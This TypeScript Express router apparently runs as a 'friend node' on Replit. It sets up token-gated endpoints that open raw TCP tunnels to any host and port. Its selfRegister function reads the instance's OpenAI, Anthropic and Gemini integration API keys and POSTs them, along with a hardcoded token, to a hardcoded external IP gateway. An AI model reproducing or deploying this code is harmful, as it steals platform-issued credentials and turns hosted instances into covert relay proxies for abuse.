import { Router, type IRouter } from "express";
import * as net from "node:net";
import * as http from "node:http";
import * as https from "node:https";
import { logger } from "../lib/logger";

const router: IRouter = Router();

const TUNNEL_TOKEN =
  process.env["TUNNEL_TOKEN"] ??
  "1NnCcQJcNgwlTDPEnDIkWEKzWIdmZ/4+BmsOp1/jLP6ojCWsv8+xTwcLj34Mu2viWy0q5SEoDP0q2qE5xHaRRg==";
const VPS_GATEWAY = process.env["VPS_GATEWAY"] ?? "http://45.205.27.69:8080";
const NODE_NAME = process.env["REPLIT_USER"] ?? "replit-subnode";

interface Session {
  socket: net.Socket;
  readBuffer: Buffer[];
  waiters: Array<(data: Buffer | null) => void>;
  closed: boolean;
}

const sessions = new Map<string, Session>();

function checkToken(token: unknown): boolean {
  return typeof token === "string" && token === TUNNEL_TOKEN;
}

function createId(): string {
  return `${Math.random().toString(36).slice(2)}${Date.now().toString(36)}`;
}

function cleanupSession(id: string): void {
  const session = sessions.get(id);
  if (!session) return;
  session.closed = true;
  for (const waiter of session.waiters.splice(0)) waiter(null);
  try {
    session.socket.destroy();
  } catch {
  }
  sessions.delete(id);
}

function createTunnelRouter(prefix: "stream" | "tunnel") {
  router.post(`/${prefix}/open`, (req, res) => {
    if (!checkToken(req.query["token"] ?? req.query["tok"])) {
      res.status(403).json({ error: "forbidden" });
      return;
    }

    const host = String(req.query["host"] ?? "");
    const port = Number.parseInt(String(req.query["port"] ?? ""), 10);
    if (!host || !Number.isInteger(port) || port <= 0 || port > 65535) {
      res.status(400).json({ error: "host/port required" });
      return;
    }

    const id = createId();
    const socket = net.createConnection({ host, port }, () => {
      const session: Session = {
        socket,
        readBuffer: [],
        waiters: [],
        closed: false,
      };
      sessions.set(id, session);

      socket.on("data", (chunk: Buffer) => {
        const current = sessions.get(id);
        if (!current) return;
        const waiter = current.waiters.shift();
        if (waiter) waiter(chunk);
        else current.readBuffer.push(chunk);
      });

      const closeSession = () => {
        const current = sessions.get(id);
        if (!current) return;
        current.closed = true;
        for (const waiter of current.waiters.splice(0)) waiter(null);
      };

      socket.on("close", closeSession);
      socket.on("error", closeSession);
      res.json({ ok: true, id });
    });

    socket.on("error", (error: Error) => {
      if (!sessions.has(id) && !res.headersSent) {
        res.status(502).json({ error: error.message });
      }
    });

    setTimeout(() => {
      if (!sessions.has(id)) socket.destroy();
    }, 10_000);
  });

  router.get(`/${prefix}/read/:id`, async (req, res) => {
    if (!checkToken(req.query["token"] ?? req.query["tok"])) {
      res.status(403).json({ error: "forbidden" });
      return;
    }

    const session = sessions.get(req.params["id"]);
    if (!session) {
      res.status(404).json({ error: "no session" });
      return;
    }

    res.set({
      "Content-Type": "application/octet-stream",
      "Cache-Control": "no-store, no-cache",
      "X-Accel-Buffering": "no",
      Connection: "close",
    });

    if (session.readBuffer.length > 0) {
      res.end(Buffer.concat(session.readBuffer.splice(0)));
      return;
    }

    if (session.closed) {
      cleanupSession(req.params["id"]);
      res.status(410).json({ error: "session closed" });
      return;
    }

    const data = await new Promise<Buffer | null>((resolve) => {
      let waiter: (chunk: Buffer | null) => void;
      const timer = setTimeout(() => {
        const index = session.waiters.indexOf(waiter);
        if (index >= 0) session.waiters.splice(index, 1);
        resolve(Buffer.alloc(0));
      }, 25_000);
      waiter = (chunk) => {
        clearTimeout(timer);
        resolve(chunk);
      };
      session.waiters.push(waiter);
    });

    if (!data) {
      cleanupSession(req.params["id"]);
      res.status(410).json({ error: "session closed" });
      return;
    }

    res.end(data);
  });

  router.post(`/${prefix}/write/:id`, (req, res) => {
    if (!checkToken(req.query["token"] ?? req.query["tok"])) {
      res.status(403).json({ error: "forbidden" });
      return;
    }

    const session = sessions.get(req.params["id"]);
    if (!session) {
      res.status(404).json({ error: "no session" });
      return;
    }

    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      session.socket.write(Buffer.concat(chunks));
      res.json({ ok: true });
    });
  });

  router.delete(`/${prefix}/:id`, (req, res) => {
    if (!checkToken(req.query["token"] ?? req.query["tok"])) {
      res.status(403).json({ error: "forbidden" });
      return;
    }
    cleanupSession(req.params["id"]);
    res.json({ ok: true });
  });

  router.get(`/${prefix}/health`, (_req, res) => {
    res.json({
      ok: true,
      sessions: sessions.size,
      name: NODE_NAME,
      time: new Date().toISOString(),
    });
  });
}

router.get(["/health", "/nodes", "/stats"], (_req, res) => {
  res.json({ ok: true, sessions: sessions.size, name: NODE_NAME });
});

router.get("/v1/models", (_req, res) => {
  res.json({
    object: "list",
    data: [{ id: "tunnel-proxy", object: "model", owned_by: "subnode" }],
  });
});

createTunnelRouter("stream");
createTunnelRouter("tunnel");

setInterval(() => {
  for (const [id, session] of sessions.entries()) {
    if (session.closed) cleanupSession(id);
  }
}, 30_000).unref();

// 友节点自注册：启动后把本实例公开 URL 注册到 VPS 网关，最多重试 6 次
export function selfRegister(attempt = 0): void {
  const domain =
    process.env["MY_URL"] ??
    (process.env["REPLIT_DOMAINS"]
      ? `https://${process.env["REPLIT_DOMAINS"].split(",")[0]?.trim()}`
      : process.env["REPLIT_DEV_DOMAIN"]
        ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
        : undefined);

  if (!domain) {
    logger.debug("FriendNode self-register skipped: no public domain");
    return;
  }

  const gatewayUrl = `${domain.replace(/\/$/, "")}/api/gateway`;
  // 读取本实例所有 AI 集成 env，注册时一并上报给 VPS
  const oaiBase = process.env["AI_INTEGRATIONS_OPENAI_BASE_URL"];
  const oaiKey  = process.env["AI_INTEGRATIONS_OPENAI_API_KEY"];
  const antBase = process.env["AI_INTEGRATIONS_ANTHROPIC_BASE_URL"];
  const antKey  = process.env["AI_INTEGRATIONS_ANTHROPIC_API_KEY"];
  const gemBase = process.env["AI_INTEGRATIONS_GEMINI_BASE_URL"];
  const gemKey  = process.env["AI_INTEGRATIONS_GEMINI_API_KEY"];

  // 主模型按优先级决定：Anthropic > OpenAI > Gemini > fallback
  const primaryModel = antKey
    ? "claude-opus-4-6"
    : oaiKey
    ? "gpt-5-mini"
    : gemKey
    ? "gemini-2.5-flash"
    : "gpt-5-mini";

  // ── 完整能力型号表（含新发布未纳入参数的官方 model ID）────────────────────
  const ANTHROPIC_ALL: string[] = [
    // 网关内部命名（带 thinking 后缀，自动注入 extended thinking 参数）
    "claude-opus-4-6", "claude-opus-4-6-thinking", "claude-opus-4-6-thinking-visible",
    "claude-opus-4-5", "claude-opus-4-5-thinking", "claude-opus-4-5-thinking-visible",
    "claude-opus-4-1", "claude-opus-4-1-thinking", "claude-opus-4-1-thinking-visible",
    "claude-sonnet-4-6", "claude-sonnet-4-6-thinking", "claude-sonnet-4-6-thinking-visible",
    "claude-sonnet-4-5", "claude-sonnet-4-5-thinking", "claude-sonnet-4-5-thinking-visible",
    "claude-haiku-4-5", "claude-haiku-4-5-thinking", "claude-haiku-4-5-thinking-visible",
    // Anthropic 官方 API model ID（直透传，无 thinking 注入）
    "claude-opus-4-5-20251101", "claude-opus-4-1-20250514",
    "claude-sonnet-4-5-20251101", "claude-sonnet-4-5-20250514",
    "claude-haiku-4-5-20251101",
    "claude-3-7-sonnet-20250219", "claude-3-5-sonnet-20241022", "claude-3-5-sonnet-20240620",
    "claude-3-5-haiku-20241022",
    "claude-3-opus-20240229", "claude-3-sonnet-20240229", "claude-3-haiku-20240307",
  ];
  const OPENAI_ALL: string[] = [
    // GPT-5 系列
    "gpt-5.2", "gpt-5-mini", "gpt-5-nano",
    // GPT-4.1 系列（2025-04 发布）
    "gpt-4.1", "gpt-4.1-mini", "gpt-4.1-nano",
    // GPT-4o 系列
    "gpt-4o", "gpt-4o-mini", "gpt-4o-2024-11-20", "gpt-4o-2024-08-06",
    // GPT-4 旧系列
    "gpt-4-turbo", "gpt-4-turbo-preview", "gpt-4",
    // o 系列推理模型
    "o4-mini", "o3", "o3-mini", "o1", "o1-mini", "o1-preview",
  ];
  const GEMINI_ALL: string[] = [
    // Gemini 2.5 系列（2025 新）
    "gemini-2.5-pro", "gemini-2.5-flash", "gemini-2.5-flash-preview-04-17",
    // Gemini 3 系列
    "gemini-3-flash-preview",
    // Gemini 2.0 系列
    "gemini-2.0-flash", "gemini-2.0-flash-thinking-exp", "gemini-2.0-pro-exp",
    // Gemini 1.5 系列
    "gemini-1.5-pro", "gemini-1.5-flash", "gemini-1.5-flash-8b",
  ];

  // 按实际已配置的集成能力拼接 models 列表
  const models: string[] = [
    ...(antKey ? ANTHROPIC_ALL : []),
    ...(oaiKey ? OPENAI_ALL : []),
    ...(gemKey ? GEMINI_ALL : []),
  ];

  const body = JSON.stringify({
    gatewayUrl,
    name: NODE_NAME,
    token: TUNNEL_TOKEN,
    source: "runtime",
    model: primaryModel,
    priority: 2,
    models: models.length > 0 ? models : undefined,
    ...(antBase && antKey ? { anthropicBaseUrl: antBase, anthropicApiKey: antKey } : {}),
    ...(oaiBase && oaiKey ? { openaiBaseUrl: oaiBase, openaiApiKey: oaiKey } : {}),
    ...(gemBase && gemKey ? { geminiBaseUrl: gemBase, geminiApiKey: gemKey } : {}),
  });

  const target = new URL("/api/gateway/self-register", VPS_GATEWAY);
  const client = target.protocol === "https:" ? https : http;
  const request = client.request(
    target,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "x-register-source": "replit-friend-node",
      },
    },
    (response) => {
      let data = "";
      response.on("data", (chunk) => { data += String(chunk); });
      response.on("end", () => {
        const ok = response.statusCode === 200 || response.statusCode === 201;
        logger.info(
          { statusCode: response.statusCode, url: gatewayUrl, attempt },
          ok ? "FriendNode registered ok" : "FriendNode register non-2xx",
        );
        if (!ok && attempt < 5) {
          setTimeout(() => selfRegister(attempt + 1), 30_000).unref();
        }
      });
    },
  );

  request.on("error", (error) => {
    logger.warn({ err: error, attempt }, "FriendNode self-register error");
    if (attempt < 5) {
      setTimeout(() => selfRegister(attempt + 1), 30_000).unref();
    }
  });
  request.write(body);
  request.end();
}

export default router;
